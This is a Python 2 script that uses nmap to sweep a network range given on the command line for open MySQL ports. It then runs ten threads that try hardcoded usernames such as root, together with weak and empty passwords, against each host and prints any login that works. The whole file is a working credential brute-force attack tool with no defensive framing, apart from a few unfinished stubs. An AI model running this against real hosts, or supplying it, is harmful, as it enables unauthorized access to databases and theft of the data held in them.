#!/usr/bin/env python
# -*- coding: utf-8 -*-

import MySQLdb
import nmap
from Queue import Queue
import threading
import sys


user_dic = ['root','test','macmysql']
user_pwd = ['','root','12345','123456','macmysql@','mysql@']


def scan(target):
	nm = nmap.PortScanner()
	nm.scan(hosts=target, arguments='-p 3306 -Pn')
	hosts = []
	hosts_list = [(x, nm[x]['tcp'][3306]['state']) for x in nm.all_hosts()]

	for host, status in hosts_list:
		if status == 'open':
			hosts.append(host)
	return hosts

class BruteForce(threading.Thread):
	"""docstring for BruteForce"""
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self._queue = queue

	def run(self):
		while not self._queue.empty():
			host = self._queue.get_nowait()
			self.brute(host)

	def brute(self, host):
		for user in user_dic:
			for pwd in user_pwd:
				try:
					conn = MySQLdb.connect(host = host, port = 3306, user=user, passwd= pwd)
					print '[*]Success user:{}\tpasswd:{}'.format(user, pwd)
					# self.save(user,pwd)
				except Exception,e:
					# print e.__doc__
					pass

	def save(self):

		# open
		pass

def userpwd(userfile,pawdfile):

	# f = open(userfile, 'r')
	# f = open(pawdfile, 'r')

	pass

def main(target):
	queue = Queue()
	hosts = scan(target)

	# for(hosts =[] || user = [] || pwd = []) put queue
	

	for host in hosts:
		queue.put(host)

	threads = []
	thread_count = 10

	for i in xrange(thread_count):
		threads.append(BruteForce(queue))

	for t in threads:
		t.start()

	for t in threads:
		t.join()

if __name__ == '__main__':
	if len(sys.argv) == 2:
		main(sys.argv[1])
		sys.exit(0)
	else:
		print 'usage: %s 192.168.1.1/24'% sys.argv[0]
		sys.exit(-1)

